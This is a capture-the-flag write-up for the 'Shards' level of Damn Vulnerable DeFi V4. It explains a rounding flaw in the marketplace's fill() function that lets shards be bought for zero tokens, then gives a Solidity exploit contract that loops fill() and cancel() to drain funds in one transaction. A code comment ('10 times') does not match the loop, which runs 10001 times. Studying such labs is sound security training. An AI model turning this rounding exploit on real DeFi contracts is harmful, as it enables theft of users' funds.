# Shards

The Shards NFT marketplace is a permissionless smart contract enabling holders of Damn Valuable NFTs to sell them at any price (expressed in USDC).

These NFTs could be so damn valuable that sellers can offer them in smaller fractions ("shards"). Buyers can buy these shards, represented by an ERC1155 token. The marketplace only pays the seller once the whole NFT is sold.

The marketplace charges sellers a 1% fee in Damn Valuable Tokens (DVT). These can be stored in a secure on-chain vault, which in turn integrates with a DVT staking system.

Somebody is selling one NFT for... wow, a million USDC?

You better dig into that marketplace before the degens find out.

You start with no DVTs. Rescue as much funds as you can in a single transaction, and deposit the assets into the designated recovery account.

#



# Challenge overview


[Official site](https://damnvulnerabledefi.xyz/challenges/shards)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

Shards challenge is the 16th level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the funds from the pool by exploting the business logic vulnerability.

## Attack Concept
This level is kinda easier side if you able to find the vulberability. If you address the vulnerability. Okay! the inside the `fill()` function, there is `want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)` calculates the number of shards a buyer can purchase based on want. However, the calculation in this function may experience underflows or calculation errors, especially with the combination of mulDivDown and _toDVT. This algorithm causes the final result to be 0 when want is a small value. This seems to be the crux of the challenge. Thus, we can acquire a significant number of NFT shards by paying 0 DVT tokens. The maximum value of want that can result in a 0-price purchase is 133.

Wait! You need to complete this process in single tx. SO, we need to do all the stuffs in another contract and call from test file to execute this without errors.

## POC
```solidity
contract Exploit {
    ShardsNFTMarketplace public marketplace;
    DamnValuableToken public token;
    address recovery;

    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;
    }

    function attack(uint64 offerId) external {
        uint256 wantShards = 100; // Fill 100 shards per call

        // Loop 10 times to execute fill(1, 100)
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }

        token.transfer(recovery,token.balanceOf(address(this)));
    }
}
```

Now, you just need to call this contract inside the test contract 
```solidity
     function test_shards() public checkSolvedByPlayer {

        Exploit exploit = new Exploit(marketplace,token,recovery);
        exploit.attack(1);      
    }
```

>Okay! This much 

If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**